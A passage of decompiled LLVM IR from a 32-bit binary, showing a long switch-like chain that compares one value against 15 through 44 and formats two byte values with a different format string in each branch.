  %v12_8049f7c = icmp eq i32 %v11_8049ca7, 15
  %v1_8049f80 = icmp eq i1 %v12_8049f7c, false
  br i1 %v1_8049f80, label %dec_label_pc_8049fac, label %dec_label_pc_8049f82

dec_label_pc_8049f82:                             ; preds = %dec_label_pc_8049f7c
  %v0_8049f82 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049f82 = zext i8 %v0_8049f82 to i32
  store i32 %v1_8049f82, i32* @edx, align 4
  %v0_8049f8e = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049f8e = zext i8 %v0_8049f8e to i32
  %v2_8049f9d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f9d, i32* @ebx, align 4
  %v5_8049fa4 = call i32 @szprintf(i32 %v2_8049f9d, i32 ptrtoint ([13 x i8]* @global_var_8058000.57 to i32), i32 %v1_8049f8e, i32 %v1_8049f82)
  br label %dec_label_pc_8049fac

dec_label_pc_8049fac:                             ; preds = %dec_label_pc_8049f7c, %dec_label_pc_8049f82
  %v9_8049fac = icmp eq i32 %v11_8049ca7, 16
  %v1_8049fb0 = icmp eq i1 %v9_8049fac, false
  br i1 %v1_8049fb0, label %dec_label_pc_8049fdc, label %dec_label_pc_8049fb2

dec_label_pc_8049fb2:                             ; preds = %dec_label_pc_8049fac
  %v0_8049fb2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049fb2 = zext i8 %v0_8049fb2 to i32
  store i32 %v1_8049fb2, i32* @edx, align 4
  %v0_8049fbe = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049fbe = zext i8 %v0_8049fbe to i32
  %v2_8049fcd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fcd, i32* @ebx, align 4
  %v5_8049fd4 = call i32 @szprintf(i32 %v2_8049fcd, i32 ptrtoint ([13 x i8]* @global_var_805800d.58 to i32), i32 %v1_8049fbe, i32 %v1_8049fb2)
  br label %dec_label_pc_8049fdc

dec_label_pc_8049fdc:                             ; preds = %dec_label_pc_8049fac, %dec_label_pc_8049fb2
  %v12_8049fdc = icmp eq i32 %v11_8049ca7, 17
  %v1_8049fe0 = icmp eq i1 %v12_8049fdc, false
  br i1 %v1_8049fe0, label %dec_label_pc_804a00c, label %dec_label_pc_8049fe2

dec_label_pc_8049fe2:                             ; preds = %dec_label_pc_8049fdc
  %v0_8049fe2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_8049fe2 = zext i8 %v0_8049fe2 to i32
  store i32 %v1_8049fe2, i32* @edx, align 4
  %v0_8049fee = load i8, i8* @global_var_805b539.40, align 1
  %v1_8049fee = zext i8 %v0_8049fee to i32
  %v2_8049ffd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ffd, i32* @ebx, align 4
  %v5_804a004 = call i32 @szprintf(i32 %v2_8049ffd, i32 ptrtoint ([13 x i8]* @global_var_805801a.59 to i32), i32 %v1_8049fee, i32 %v1_8049fe2)
  br label %dec_label_pc_804a00c

dec_label_pc_804a00c:                             ; preds = %dec_label_pc_8049fdc, %dec_label_pc_8049fe2
  %v12_804a00c = icmp eq i32 %v11_8049ca7, 18
  %v1_804a010 = icmp eq i1 %v12_804a00c, false
  br i1 %v1_804a010, label %dec_label_pc_804a03c, label %dec_label_pc_804a012

dec_label_pc_804a012:                             ; preds = %dec_label_pc_804a00c
  %v0_804a012 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a012 = zext i8 %v0_804a012 to i32
  store i32 %v1_804a012, i32* @edx, align 4
  %v0_804a01e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a01e = zext i8 %v0_804a01e to i32
  %v2_804a02d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a02d, i32* @ebx, align 4
  %v5_804a034 = call i32 @szprintf(i32 %v2_804a02d, i32 ptrtoint ([13 x i8]* @global_var_8058027.60 to i32), i32 %v1_804a01e, i32 %v1_804a012)
  br label %dec_label_pc_804a03c

dec_label_pc_804a03c:                             ; preds = %dec_label_pc_804a00c, %dec_label_pc_804a012
  %v12_804a03c = icmp eq i32 %v11_8049ca7, 19
  %v1_804a040 = icmp eq i1 %v12_804a03c, false
  br i1 %v1_804a040, label %dec_label_pc_804a06c, label %dec_label_pc_804a042

dec_label_pc_804a042:                             ; preds = %dec_label_pc_804a03c
  %v0_804a042 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a042 = zext i8 %v0_804a042 to i32
  store i32 %v1_804a042, i32* @edx, align 4
  %v0_804a04e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a04e = zext i8 %v0_804a04e to i32
  %v2_804a05d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a05d, i32* @ebx, align 4
  %v5_804a064 = call i32 @szprintf(i32 %v2_804a05d, i32 ptrtoint ([11 x i8]* @global_var_8058034.61 to i32), i32 %v1_804a04e, i32 %v1_804a042)
  br label %dec_label_pc_804a06c

dec_label_pc_804a06c:                             ; preds = %dec_label_pc_804a03c, %dec_label_pc_804a042
  %v12_804a06c = icmp eq i32 %v11_8049ca7, 20
  %v1_804a070 = icmp eq i1 %v12_804a06c, false
  br i1 %v1_804a070, label %dec_label_pc_804a09c, label %dec_label_pc_804a072

dec_label_pc_804a072:                             ; preds = %dec_label_pc_804a06c
  %v0_804a072 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a072 = zext i8 %v0_804a072 to i32
  store i32 %v1_804a072, i32* @edx, align 4
  %v0_804a07e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a07e = zext i8 %v0_804a07e to i32
  %v2_804a08d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a08d, i32* @ebx, align 4
  %v5_804a094 = call i32 @szprintf(i32 %v2_804a08d, i32 ptrtoint ([12 x i8]* @global_var_805803f.62 to i32), i32 %v1_804a07e, i32 %v1_804a072)
  br label %dec_label_pc_804a09c

dec_label_pc_804a09c:                             ; preds = %dec_label_pc_804a06c, %dec_label_pc_804a072
  %v12_804a09c = icmp eq i32 %v11_8049ca7, 21
  %v1_804a0a0 = icmp eq i1 %v12_804a09c, false
  br i1 %v1_804a0a0, label %dec_label_pc_804a0cc, label %dec_label_pc_804a0a2

dec_label_pc_804a0a2:                             ; preds = %dec_label_pc_804a09c
  %v0_804a0a2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a0a2 = zext i8 %v0_804a0a2 to i32
  store i32 %v1_804a0a2, i32* @edx, align 4
  %v0_804a0ae = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a0ae = zext i8 %v0_804a0ae to i32
  %v2_804a0bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0bd, i32* @ebx, align 4
  %v5_804a0c4 = call i32 @szprintf(i32 %v2_804a0bd, i32 ptrtoint ([13 x i8]* @global_var_805804b.63 to i32), i32 %v1_804a0ae, i32 %v1_804a0a2)
  br label %dec_label_pc_804a0cc

dec_label_pc_804a0cc:                             ; preds = %dec_label_pc_804a09c, %dec_label_pc_804a0a2
  %v12_804a0cc = icmp eq i32 %v11_8049ca7, 22
  %v1_804a0d0 = icmp eq i1 %v12_804a0cc, false
  br i1 %v1_804a0d0, label %dec_label_pc_804a0fc, label %dec_label_pc_804a0d2

dec_label_pc_804a0d2:                             ; preds = %dec_label_pc_804a0cc
  %v0_804a0d2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a0d2 = zext i8 %v0_804a0d2 to i32
  store i32 %v1_804a0d2, i32* @edx, align 4
  %v0_804a0de = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a0de = zext i8 %v0_804a0de to i32
  %v2_804a0ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0ed, i32* @ebx, align 4
  %v5_804a0f4 = call i32 @szprintf(i32 %v2_804a0ed, i32 ptrtoint ([11 x i8]* @global_var_8058058.64 to i32), i32 %v1_804a0de, i32 %v1_804a0d2)
  br label %dec_label_pc_804a0fc

dec_label_pc_804a0fc:                             ; preds = %dec_label_pc_804a0cc, %dec_label_pc_804a0d2
  %v12_804a0fc = icmp eq i32 %v11_8049ca7, 23
  %v1_804a100 = icmp eq i1 %v12_804a0fc, false
  br i1 %v1_804a100, label %dec_label_pc_804a12c, label %dec_label_pc_804a102

dec_label_pc_804a102:                             ; preds = %dec_label_pc_804a0fc
  %v0_804a102 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a102 = zext i8 %v0_804a102 to i32
  store i32 %v1_804a102, i32* @edx, align 4
  %v0_804a10e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a10e = zext i8 %v0_804a10e to i32
  %v2_804a11d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a11d, i32* @ebx, align 4
  %v5_804a124 = call i32 @szprintf(i32 %v2_804a11d, i32 ptrtoint ([11 x i8]* @global_var_8058063.65 to i32), i32 %v1_804a10e, i32 %v1_804a102)
  br label %dec_label_pc_804a12c

dec_label_pc_804a12c:                             ; preds = %dec_label_pc_804a0fc, %dec_label_pc_804a102
  %v12_804a12c = icmp eq i32 %v11_8049ca7, 24
  %v1_804a130 = icmp eq i1 %v12_804a12c, false
  br i1 %v1_804a130, label %dec_label_pc_804a15c, label %dec_label_pc_804a132

dec_label_pc_804a132:                             ; preds = %dec_label_pc_804a12c
  %v0_804a132 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a132 = zext i8 %v0_804a132 to i32
  store i32 %v1_804a132, i32* @edx, align 4
  %v0_804a13e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a13e = zext i8 %v0_804a13e to i32
  %v2_804a14d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a14d, i32* @ebx, align 4
  %v5_804a154 = call i32 @szprintf(i32 %v2_804a14d, i32 ptrtoint ([12 x i8]* @global_var_805806e.66 to i32), i32 %v1_804a13e, i32 %v1_804a132)
  br label %dec_label_pc_804a15c

dec_label_pc_804a15c:                             ; preds = %dec_label_pc_804a12c, %dec_label_pc_804a132
  %v12_804a15c = icmp eq i32 %v11_8049ca7, 25
  %v1_804a160 = icmp eq i1 %v12_804a15c, false
  br i1 %v1_804a160, label %dec_label_pc_804a18c, label %dec_label_pc_804a162

dec_label_pc_804a162:                             ; preds = %dec_label_pc_804a15c
  %v0_804a162 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a162 = zext i8 %v0_804a162 to i32
  store i32 %v1_804a162, i32* @edx, align 4
  %v0_804a16e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a16e = zext i8 %v0_804a16e to i32
  %v2_804a17d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a17d, i32* @ebx, align 4
  %v5_804a184 = call i32 @szprintf(i32 %v2_804a17d, i32 ptrtoint ([12 x i8]* @global_var_805807a.67 to i32), i32 %v1_804a16e, i32 %v1_804a162)
  br label %dec_label_pc_804a18c

dec_label_pc_804a18c:                             ; preds = %dec_label_pc_804a15c, %dec_label_pc_804a162
  %v12_804a18c = icmp eq i32 %v11_8049ca7, 26
  %v1_804a190 = icmp eq i1 %v12_804a18c, false
  br i1 %v1_804a190, label %dec_label_pc_804a1bc, label %dec_label_pc_804a192

dec_label_pc_804a192:                             ; preds = %dec_label_pc_804a18c
  %v0_804a192 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a192 = zext i8 %v0_804a192 to i32
  store i32 %v1_804a192, i32* @edx, align 4
  %v0_804a19e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a19e = zext i8 %v0_804a19e to i32
  %v2_804a1ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1ad, i32* @ebx, align 4
  %v5_804a1b4 = call i32 @szprintf(i32 %v2_804a1ad, i32 ptrtoint ([12 x i8]* @global_var_8058086.68 to i32), i32 %v1_804a19e, i32 %v1_804a192)
  br label %dec_label_pc_804a1bc

dec_label_pc_804a1bc:                             ; preds = %dec_label_pc_804a18c, %dec_label_pc_804a192
  %v12_804a1bc = icmp eq i32 %v11_8049ca7, 27
  %v1_804a1c0 = icmp eq i1 %v12_804a1bc, false
  br i1 %v1_804a1c0, label %dec_label_pc_804a1ec, label %dec_label_pc_804a1c2

dec_label_pc_804a1c2:                             ; preds = %dec_label_pc_804a1bc
  %v0_804a1c2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a1c2 = zext i8 %v0_804a1c2 to i32
  store i32 %v1_804a1c2, i32* @edx, align 4
  %v0_804a1ce = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a1ce = zext i8 %v0_804a1ce to i32
  %v2_804a1dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1dd, i32* @ebx, align 4
  %v5_804a1e4 = call i32 @szprintf(i32 %v2_804a1dd, i32 ptrtoint ([13 x i8]* @global_var_8058092.69 to i32), i32 %v1_804a1ce, i32 %v1_804a1c2)
  br label %dec_label_pc_804a1ec

dec_label_pc_804a1ec:                             ; preds = %dec_label_pc_804a1bc, %dec_label_pc_804a1c2
  %v12_804a1ec = icmp eq i32 %v11_8049ca7, 28
  %v1_804a1f0 = icmp eq i1 %v12_804a1ec, false
  br i1 %v1_804a1f0, label %dec_label_pc_804a21c, label %dec_label_pc_804a1f2

dec_label_pc_804a1f2:                             ; preds = %dec_label_pc_804a1ec
  %v0_804a1f2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a1f2 = zext i8 %v0_804a1f2 to i32
  store i32 %v1_804a1f2, i32* @edx, align 4
  %v0_804a1fe = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a1fe = zext i8 %v0_804a1fe to i32
  %v2_804a20d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a20d, i32* @ebx, align 4
  %v5_804a214 = call i32 @szprintf(i32 %v2_804a20d, i32 ptrtoint ([13 x i8]* @global_var_805809f.70 to i32), i32 %v1_804a1fe, i32 %v1_804a1f2)
  br label %dec_label_pc_804a21c

dec_label_pc_804a21c:                             ; preds = %dec_label_pc_804a1ec, %dec_label_pc_804a1f2
  %v12_804a21c = icmp eq i32 %v11_8049ca7, 29
  %v1_804a220 = icmp eq i1 %v12_804a21c, false
  br i1 %v1_804a220, label %dec_label_pc_804a24c, label %dec_label_pc_804a222

dec_label_pc_804a222:                             ; preds = %dec_label_pc_804a21c
  %v0_804a222 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a222 = zext i8 %v0_804a222 to i32
  store i32 %v1_804a222, i32* @edx, align 4
  %v0_804a22e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a22e = zext i8 %v0_804a22e to i32
  %v2_804a23d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a23d, i32* @ebx, align 4
  %v5_804a244 = call i32 @szprintf(i32 %v2_804a23d, i32 ptrtoint ([12 x i8]* @global_var_80580ac.71 to i32), i32 %v1_804a22e, i32 %v1_804a222)
  br label %dec_label_pc_804a24c

dec_label_pc_804a24c:                             ; preds = %dec_label_pc_804a21c, %dec_label_pc_804a222
  %v12_804a24c = icmp eq i32 %v11_8049ca7, 30
  %v1_804a250 = icmp eq i1 %v12_804a24c, false
  br i1 %v1_804a250, label %dec_label_pc_804a27c, label %dec_label_pc_804a252

dec_label_pc_804a252:                             ; preds = %dec_label_pc_804a24c
  %v0_804a252 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a252 = zext i8 %v0_804a252 to i32
  store i32 %v1_804a252, i32* @edx, align 4
  %v0_804a25e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a25e = zext i8 %v0_804a25e to i32
  %v2_804a26d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a26d, i32* @ebx, align 4
  %v5_804a274 = call i32 @szprintf(i32 %v2_804a26d, i32 ptrtoint ([13 x i8]* @global_var_80580b8.72 to i32), i32 %v1_804a25e, i32 %v1_804a252)
  br label %dec_label_pc_804a27c

dec_label_pc_804a27c:                             ; preds = %dec_label_pc_804a24c, %dec_label_pc_804a252
  %v12_804a27c = icmp eq i32 %v11_8049ca7, 31
  %v1_804a280 = icmp eq i1 %v12_804a27c, false
  br i1 %v1_804a280, label %dec_label_pc_804a2ac, label %dec_label_pc_804a282

dec_label_pc_804a282:                             ; preds = %dec_label_pc_804a27c
  %v0_804a282 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a282 = zext i8 %v0_804a282 to i32
  store i32 %v1_804a282, i32* @edx, align 4
  %v0_804a28e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a28e = zext i8 %v0_804a28e to i32
  %v2_804a29d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a29d, i32* @ebx, align 4
  %v5_804a2a4 = call i32 @szprintf(i32 %v2_804a29d, i32 ptrtoint ([12 x i8]* @global_var_80580c5.73 to i32), i32 %v1_804a28e, i32 %v1_804a282)
  br label %dec_label_pc_804a2ac

dec_label_pc_804a2ac:                             ; preds = %dec_label_pc_804a27c, %dec_label_pc_804a282
  %v9_804a2ac = icmp eq i32 %v11_8049ca7, 32
  %v1_804a2b0 = icmp eq i1 %v9_804a2ac, false
  br i1 %v1_804a2b0, label %dec_label_pc_804a2dc, label %dec_label_pc_804a2b2

dec_label_pc_804a2b2:                             ; preds = %dec_label_pc_804a2ac
  %v0_804a2b2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a2b2 = zext i8 %v0_804a2b2 to i32
  store i32 %v1_804a2b2, i32* @edx, align 4
  %v0_804a2be = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a2be = zext i8 %v0_804a2be to i32
  %v2_804a2cd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2cd, i32* @ebx, align 4
  %v5_804a2d4 = call i32 @szprintf(i32 %v2_804a2cd, i32 ptrtoint ([11 x i8]* @global_var_80580d1.74 to i32), i32 %v1_804a2be, i32 %v1_804a2b2)
  br label %dec_label_pc_804a2dc

dec_label_pc_804a2dc:                             ; preds = %dec_label_pc_804a2ac, %dec_label_pc_804a2b2
  %v12_804a2dc = icmp eq i32 %v11_8049ca7, 33
  %v1_804a2e0 = icmp eq i1 %v12_804a2dc, false
  br i1 %v1_804a2e0, label %dec_label_pc_804a30c, label %dec_label_pc_804a2e2

dec_label_pc_804a2e2:                             ; preds = %dec_label_pc_804a2dc
  %v0_804a2e2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a2e2 = zext i8 %v0_804a2e2 to i32
  store i32 %v1_804a2e2, i32* @edx, align 4
  %v0_804a2ee = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a2ee = zext i8 %v0_804a2ee to i32
  %v2_804a2fd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2fd, i32* @ebx, align 4
  %v5_804a304 = call i32 @szprintf(i32 %v2_804a2fd, i32 ptrtoint ([12 x i8]* @global_var_80580dc.75 to i32), i32 %v1_804a2ee, i32 %v1_804a2e2)
  br label %dec_label_pc_804a30c

dec_label_pc_804a30c:                             ; preds = %dec_label_pc_804a2dc, %dec_label_pc_804a2e2
  %v12_804a30c = icmp eq i32 %v11_8049ca7, 34
  %v1_804a310 = icmp eq i1 %v12_804a30c, false
  br i1 %v1_804a310, label %dec_label_pc_804a33c, label %dec_label_pc_804a312

dec_label_pc_804a312:                             ; preds = %dec_label_pc_804a30c
  %v0_804a312 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a312 = zext i8 %v0_804a312 to i32
  store i32 %v1_804a312, i32* @edx, align 4
  %v0_804a31e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a31e = zext i8 %v0_804a31e to i32
  %v2_804a32d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a32d, i32* @ebx, align 4
  %v5_804a334 = call i32 @szprintf(i32 %v2_804a32d, i32 ptrtoint ([12 x i8]* @global_var_80580e8.76 to i32), i32 %v1_804a31e, i32 %v1_804a312)
  br label %dec_label_pc_804a33c

dec_label_pc_804a33c:                             ; preds = %dec_label_pc_804a30c, %dec_label_pc_804a312
  %v12_804a33c = icmp eq i32 %v11_8049ca7, 35
  %v1_804a340 = icmp eq i1 %v12_804a33c, false
  br i1 %v1_804a340, label %dec_label_pc_804a36c, label %dec_label_pc_804a342

dec_label_pc_804a342:                             ; preds = %dec_label_pc_804a33c
  %v0_804a342 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a342 = zext i8 %v0_804a342 to i32
  store i32 %v1_804a342, i32* @edx, align 4
  %v0_804a34e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a34e = zext i8 %v0_804a34e to i32
  %v2_804a35d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a35d, i32* @ebx, align 4
  %v5_804a364 = call i32 @szprintf(i32 %v2_804a35d, i32 ptrtoint ([12 x i8]* @global_var_80580f4.77 to i32), i32 %v1_804a34e, i32 %v1_804a342)
  br label %dec_label_pc_804a36c

dec_label_pc_804a36c:                             ; preds = %dec_label_pc_804a33c, %dec_label_pc_804a342
  %v12_804a36c = icmp eq i32 %v11_8049ca7, 36
  %v1_804a370 = icmp eq i1 %v12_804a36c, false
  br i1 %v1_804a370, label %dec_label_pc_804a39c, label %dec_label_pc_804a372

dec_label_pc_804a372:                             ; preds = %dec_label_pc_804a36c
  %v0_804a372 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a372 = zext i8 %v0_804a372 to i32
  store i32 %v1_804a372, i32* @edx, align 4
  %v0_804a37e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a37e = zext i8 %v0_804a37e to i32
  %v2_804a38d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a38d, i32* @ebx, align 4
  %v5_804a394 = call i32 @szprintf(i32 %v2_804a38d, i32 ptrtoint ([12 x i8]* @global_var_8058100.78 to i32), i32 %v1_804a37e, i32 %v1_804a372)
  br label %dec_label_pc_804a39c

dec_label_pc_804a39c:                             ; preds = %dec_label_pc_804a36c, %dec_label_pc_804a372
  %v12_804a39c = icmp eq i32 %v11_8049ca7, 37
  %v1_804a3a0 = icmp eq i1 %v12_804a39c, false
  br i1 %v1_804a3a0, label %dec_label_pc_804a3cc, label %dec_label_pc_804a3a2

dec_label_pc_804a3a2:                             ; preds = %dec_label_pc_804a39c
  %v0_804a3a2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a3a2 = zext i8 %v0_804a3a2 to i32
  store i32 %v1_804a3a2, i32* @edx, align 4
  %v0_804a3ae = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a3ae = zext i8 %v0_804a3ae to i32
  %v2_804a3bd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3bd, i32* @ebx, align 4
  %v5_804a3c4 = call i32 @szprintf(i32 %v2_804a3bd, i32 ptrtoint ([12 x i8]* @global_var_805810c.79 to i32), i32 %v1_804a3ae, i32 %v1_804a3a2)
  br label %dec_label_pc_804a3cc

dec_label_pc_804a3cc:                             ; preds = %dec_label_pc_804a39c, %dec_label_pc_804a3a2
  %v12_804a3cc = icmp eq i32 %v11_8049ca7, 38
  %v1_804a3d0 = icmp eq i1 %v12_804a3cc, false
  br i1 %v1_804a3d0, label %dec_label_pc_804a3fc, label %dec_label_pc_804a3d2

dec_label_pc_804a3d2:                             ; preds = %dec_label_pc_804a3cc
  %v0_804a3d2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a3d2 = zext i8 %v0_804a3d2 to i32
  store i32 %v1_804a3d2, i32* @edx, align 4
  %v0_804a3de = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a3de = zext i8 %v0_804a3de to i32
  %v2_804a3ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a3ed, i32* @ebx, align 4
  %v5_804a3f4 = call i32 @szprintf(i32 %v2_804a3ed, i32 ptrtoint ([13 x i8]* @global_var_8058118.80 to i32), i32 %v1_804a3de, i32 %v1_804a3d2)
  br label %dec_label_pc_804a3fc

dec_label_pc_804a3fc:                             ; preds = %dec_label_pc_804a3cc, %dec_label_pc_804a3d2
  %v12_804a3fc = icmp eq i32 %v11_8049ca7, 39
  %v1_804a400 = icmp eq i1 %v12_804a3fc, false
  br i1 %v1_804a400, label %dec_label_pc_804a42c, label %dec_label_pc_804a402

dec_label_pc_804a402:                             ; preds = %dec_label_pc_804a3fc
  %v0_804a402 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a402 = zext i8 %v0_804a402 to i32
  store i32 %v1_804a402, i32* @edx, align 4
  %v0_804a40e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a40e = zext i8 %v0_804a40e to i32
  %v2_804a41d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a41d, i32* @ebx, align 4
  %v5_804a424 = call i32 @szprintf(i32 %v2_804a41d, i32 ptrtoint ([13 x i8]* @global_var_8058125.81 to i32), i32 %v1_804a40e, i32 %v1_804a402)
  br label %dec_label_pc_804a42c

dec_label_pc_804a42c:                             ; preds = %dec_label_pc_804a3fc, %dec_label_pc_804a402
  %v12_804a42c = icmp eq i32 %v11_8049ca7, 40
  %v1_804a430 = icmp eq i1 %v12_804a42c, false
  br i1 %v1_804a430, label %dec_label_pc_804a45c, label %dec_label_pc_804a432

dec_label_pc_804a432:                             ; preds = %dec_label_pc_804a42c
  %v0_804a432 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a432 = zext i8 %v0_804a432 to i32
  store i32 %v1_804a432, i32* @edx, align 4
  %v0_804a43e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a43e = zext i8 %v0_804a43e to i32
  %v2_804a44d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a44d, i32* @ebx, align 4
  %v5_804a454 = call i32 @szprintf(i32 %v2_804a44d, i32 ptrtoint ([13 x i8]* @global_var_8058118.80 to i32), i32 %v1_804a43e, i32 %v1_804a432)
  br label %dec_label_pc_804a45c

dec_label_pc_804a45c:                             ; preds = %dec_label_pc_804a42c, %dec_label_pc_804a432
  %v12_804a45c = icmp eq i32 %v11_8049ca7, 41
  %v1_804a460 = icmp eq i1 %v12_804a45c, false
  br i1 %v1_804a460, label %dec_label_pc_804a48c, label %dec_label_pc_804a462

dec_label_pc_804a462:                             ; preds = %dec_label_pc_804a45c
  %v0_804a462 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a462 = zext i8 %v0_804a462 to i32
  store i32 %v1_804a462, i32* @edx, align 4
  %v0_804a46e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a46e = zext i8 %v0_804a46e to i32
  %v2_804a47d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a47d, i32* @ebx, align 4
  %v5_804a484 = call i32 @szprintf(i32 %v2_804a47d, i32 ptrtoint ([13 x i8]* @global_var_8058132.82 to i32), i32 %v1_804a46e, i32 %v1_804a462)
  br label %dec_label_pc_804a48c

dec_label_pc_804a48c:                             ; preds = %dec_label_pc_804a45c, %dec_label_pc_804a462
  %v12_804a48c = icmp eq i32 %v11_8049ca7, 42
  %v1_804a490 = icmp eq i1 %v12_804a48c, false
  br i1 %v1_804a490, label %dec_label_pc_804a4bc, label %dec_label_pc_804a492

dec_label_pc_804a492:                             ; preds = %dec_label_pc_804a48c
  %v0_804a492 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a492 = zext i8 %v0_804a492 to i32
  store i32 %v1_804a492, i32* @edx, align 4
  %v0_804a49e = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a49e = zext i8 %v0_804a49e to i32
  %v2_804a4ad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4ad, i32* @ebx, align 4
  %v5_804a4b4 = call i32 @szprintf(i32 %v2_804a4ad, i32 ptrtoint ([13 x i8]* @global_var_805813f.83 to i32), i32 %v1_804a49e, i32 %v1_804a492)
  br label %dec_label_pc_804a4bc

dec_label_pc_804a4bc:                             ; preds = %dec_label_pc_804a48c, %dec_label_pc_804a492
  %v12_804a4bc = icmp eq i32 %v11_8049ca7, 43
  %v1_804a4c0 = icmp eq i1 %v12_804a4bc, false
  br i1 %v1_804a4c0, label %dec_label_pc_804a4ec, label %dec_label_pc_804a4c2

dec_label_pc_804a4c2:                             ; preds = %dec_label_pc_804a4bc
  %v0_804a4c2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a4c2 = zext i8 %v0_804a4c2 to i32
  store i32 %v1_804a4c2, i32* @edx, align 4
  %v0_804a4ce = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a4ce = zext i8 %v0_804a4ce to i32
  %v2_804a4dd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a4dd, i32* @ebx, align 4
  %v5_804a4e4 = call i32 @szprintf(i32 %v2_804a4dd, i32 ptrtoint ([13 x i8]* @global_var_805814c.84 to i32), i32 %v1_804a4ce, i32 %v1_804a4c2)
  br label %dec_label_pc_804a4ec

dec_label_pc_804a4ec:                             ; preds = %dec_label_pc_804a4bc, %dec_label_pc_804a4c2
  %v12_804a4ec = icmp eq i32 %v11_8049ca7, 44
  %v1_804a4f0 = icmp eq i1 %v12_804a4ec, false
  br i1 %v1_804a4f0, label %dec_label_pc_804a51c, label %dec_label_pc_804a4f2

dec_label_pc_804a4f2:                             ; preds = %dec_label_pc_804a4ec
  %v0_804a4f2 = load i8, i8* @global_var_805b53a.41, align 2
  %v1_804a4f2 = zext i8 %v0_804a4f2 to i32
  store i32 %v1_804a4f2, i32* @edx, align 4
  %v0_804a4fe = load i8, i8* @global_var_805b539.40, align 1
  %v1_804a4fe = zext i8 %v0_804a4fe to i32
  %v2_804a50d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a50d, i32* @ebx, align 4
